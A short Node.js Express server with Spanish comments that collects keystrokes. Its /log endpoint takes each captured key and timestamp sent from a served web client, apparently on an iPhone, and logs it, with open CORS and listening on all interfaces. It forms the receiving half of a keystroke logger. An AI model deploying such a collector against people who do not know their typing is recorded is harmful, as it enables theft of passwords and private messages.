const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware para procesar JSON y permitir CORS
app.use(express.json());
app.use(cors());

// Servir la interfaz web (el "cliente")
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint que recibe las pulsaciones
app.post('/log', (req, res) => {
    const { tecla, timestamp } = req.body;
    console.log(`[${timestamp}] Tecla capturada: ${tecla}`);
    res.sendStatus(200);
});

// Escuchar en todas las interfaces de red para permitir la conexión del iPhone
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor de auditoría escuchando en el puerto ${PORT}`);
    console.log('Esperando conexiones...');
});